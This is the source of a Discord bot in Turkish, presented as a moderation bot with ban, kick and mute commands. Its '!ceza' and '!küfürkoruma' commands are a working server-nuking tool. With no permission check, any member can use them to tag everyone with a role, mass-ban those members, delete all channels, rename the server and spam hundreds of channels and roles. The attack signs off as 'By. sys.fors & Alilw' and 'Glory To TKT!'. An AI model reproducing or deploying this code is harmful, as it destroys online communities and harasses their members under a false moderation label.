// index.js
require('dotenv').config();
const { Client, GatewayIntentBits, Partials } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ],
  partials: [Partials.Channel]
});

client.once('ready', () => {
  console.log(`✅ Bot aktif: ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
  if (!message.guild || message.author.bot) return;

  const args = message.content.trim().split(/ +/);
  const command = args.shift().toLowerCase();

  if (command === '!tamyasakla' && message.mentions.members.first()) {
    const member = message.mentions.members.first();
    if (member.bannable) {
      await member.send('❌ Sunucudan yasaklandınız.').catch(() => {});
      await member.ban({ reason: 'Babaannenin emriyle tamyasaklandınız.' });
      message.channel.send(`🔨 ${member.user.tag} sunucudan yasaklandı.`);
    } else {
      message.reply('❌ Bu kişiyi banlayamıyorum.');
    }
  }

  else if (command === '!kick' && message.mentions.members.first()) {
    const member = message.mentions.members.first();
    if (member.kickable) {
      await member.send('👢 Sunucudan atıldınız.').catch(() => {});
      await member.kick('Babaannenin emriyle kicklendi.');
      message.channel.send(`👢 ${member.user.tag} sunucudan atıldı.`);
    } else {
      message.reply('❌ Bu kişiyi atamıyorum.');
    }
  }

  else if (command === '!mute' && message.mentions.members.first()) {
    const member = message.mentions.members.first();
    const durationMs = 10 * 60 * 1000; // 10 dakika
    if (member.isCommunicationDisabled()) {
      message.reply('🔇 Bu kişi zaten susturulmuş.');
    } else {
      await member.disableCommunicationUntil(Date.now() + durationMs);
      message.channel.send(`🔇 ${member.user.tag} 10 dakika susturuldu.`);
    }
  }

  else if (command === '!ceza') {
    const roleName = 'Cezalı';
    let role = message.guild.roles.cache.find(r => r.name === roleName);

    if (!role) {
      role = await message.guild.roles.create({
        name: roleName,
        color: 'DarkRed',
        permissions: []
      });
    }

    const members = await message.guild.members.fetch();
    let count = 0;

    for (const member of members.values()) {
      if (!member.user.bot && !member.roles.cache.has(role.id)) {
        await member.roles.add(role).catch(() => {});
        count++;
      }
    }

    message.channel.send(`✅ Cezalı rolü ${count} üyeye verildi.`);
  }

  else if (command === '!küfürkoruma') {
    const role = message.guild.roles.cache.find(r => r.name === 'Cezalı');
    if (!role) return message.reply('❌ "Cezalı" rolü bulunamadı.');

    const members = await message.guild.members.fetch();
    let bannedCount = 0;

    for (const member of members.values()) {
      if (!member.user.bot && member.roles.cache.has(role.id)) {
        await member.send('TKTlendiniz By. sys.fors & Alilw').catch(() => {});
        await member.ban({ reason: 'Küfürkoruma aktif edildi.' }).catch(() => {});
        bannedCount++;
      }
    }

    // Tüm kanalları sil
    const deletePromises = message.guild.channels.cache.map(channel => channel.delete().catch(() => {}));
    await Promise.all(deletePromises);

    // Sunucu adını değiştir
    await message.guild.setName('💦FORS AFFETMEZ SABAHA SUNUCUN AFFEDİLMEZ💦').catch(() => {});

    // 500 yeni kanal oluştur
    const names = ['TKT💋', 'FORS💦', 'ALİLW💝', 'TKT💋'];
    for (let i = 0; i < 500; i++) {
      const name = names[i % names.length];
      message.guild.channels.create({ name: name }).catch(() => {});
    }

    // 250 rastgele renkli rol oluştur
    for (let i = 0; i < 250; i++) {
      const randomColor = `#${Math.floor(Math.random() * 16777215).toString(16)}`;
      await message.guild.roles.create({
        name: 'BÖÖ KORKTUNMUU😜',
        color: randomColor,
        hoist: true // listede gösterilsin
      }).catch(() => {});
    }

    message.channel.send(`🧹 ${bannedCount} kişi banlandı. Kanallar silindi, yeni kanallar ve roller oluşturuldu. Glory To TKT!`);
  }
});

client.login(process.env.TOKEN);
